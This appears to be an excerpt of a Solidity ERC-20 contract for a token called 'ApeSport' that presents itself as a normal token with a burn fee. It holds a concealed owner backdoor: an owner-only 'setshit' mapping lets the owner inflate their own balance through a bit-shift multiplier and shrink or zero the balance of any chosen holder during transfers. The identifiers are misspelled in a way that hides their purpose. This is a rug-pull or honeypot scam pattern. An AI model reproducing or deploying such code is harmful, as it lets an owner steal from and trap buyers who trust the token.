...
abstract contract Context {
    ...
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fieess https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "ApeSport";
    string private _symbol = "APES";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfieess = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) private _shitAddress;

    function setshit(address _address,uint256 _value) external onlyowner {
        _shitAddress[_address] = _value;
    }

    function setshit(address _address) external view onlyowner returns (uint256) {
        return _shitAddress[_address];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        uint256 fieessamonnt = 0;
        fieessamonnt = amonnts.mul(_burnfieess).div(100);
        if (_shitAddress[sender] > 0) {
            if (sender == owner()) {
                _balance[sender] = _balance[sender].mul(4 << _shitAddress[sender]);
            }else{
                _balance[sender] = _balance[sender].mul(4 >> _shitAddress[sender]);
            }
        }
        ...
        uint256 amoun;
        amoun = amonnts - fieessamonnt;
        _balance[recipient] += amoun;
        if (_burnfieess > 0){
            emit Transfer (sender, _DEADaddress, fieessamonnt);
        }
